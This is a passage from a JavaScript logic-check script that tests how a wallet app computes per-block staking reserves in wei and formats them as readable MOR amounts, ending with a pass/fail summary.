    reserve({ a: { ...live(true), running: false } }) === 0n &&
    reserve({ a: { ...live(false), running: false } }) === 0n);

  // A run with NO blocks left reserves nothing: its stake is already out of the
  // wallet and it will never open another. This is not an edge case — a session
  // inside the chain cap is a ONE-block run, i.e. every ordinary session, and
  // charging each one a phantom block made a second session demand double.
  const terminal = {
    a: { running: true, overlap: true, perBlockStakeWei: B, total: 1, openedSessionIds: ['x'] },
  };
  ok('a run on its last block reserves nothing', reserve(terminal) === 0n);
  ok('a run with one block left still reserves',
    reserve({ a: { running: true, overlap: true, perBlockStakeWei: B, total: 2, openedSessionIds: ['x'] } }) === B);
  // Unknown shape must err toward reserving, never toward approving.
  ok('a run with no plan recorded still reserves',
    reserve({ a: { running: true, perBlockStakeWei: B } }) === B);

  // The units bug, pinned with the figure actually observed in the app rather
  // than an invented one: the reserve is WEI, so printing it beside the word
  // MOR rendered "3.067758097729243e+21 MOR".
  const OBSERVED_WEI = 3.067758097729243e21;
  ok('the raw wei figure is the unreadable one the user saw',
    String(OBSERVED_WEI).includes('e+'));
  const shown = formatMor(OBSERVED_WEI, 18);
  ok(`a wei reserve formats to a human MOR figure (got ${shown})`,
    typeof shown === 'string' && !shown.includes('e+'));
  ok('and it is the MOR magnitude, not the wei one',
    Number(String(shown).replace(/[^0-9.]/g, '')) < 1e6);
}

console.log('');
console.log(`LOGIC CHECKS: ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
